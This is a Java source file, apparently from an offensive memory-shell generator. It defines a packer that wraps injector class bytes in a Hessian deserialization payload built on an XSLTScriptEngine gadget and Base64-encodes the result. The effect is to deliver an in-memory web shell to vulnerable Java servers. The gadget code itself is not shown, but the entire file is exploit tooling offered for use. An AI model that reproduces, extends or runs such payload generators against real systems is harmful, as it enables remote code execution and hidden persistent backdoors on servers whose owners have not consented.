package com.reajason.javaweb.memshell.packer.deserialize.hessian;

import com.reajason.javaweb.deserialize.DeserializeConfig;
import com.reajason.javaweb.deserialize.HessianDeserializeGenerator;
import com.reajason.javaweb.deserialize.PayloadType;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

import java.util.Base64;



/**
 * @author ReaJason
 * @since 2025/2/20
 */
public class HessianXSLTScriptEnginePacker implements Packer {
    @Override
    public String pack(GenerateResult generateResult) {
        byte[] injectorBytes = generateResult.getInjectorBytes();
        String injectorClassName = generateResult.getInjectorClassName();
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.XSLTScriptEngine);
        byte[] generate = HessianDeserializeGenerator.generate(injectorBytes, injectorClassName, deserializeConfig);
        return Base64.getEncoder().encodeToString(generate);
    }
}
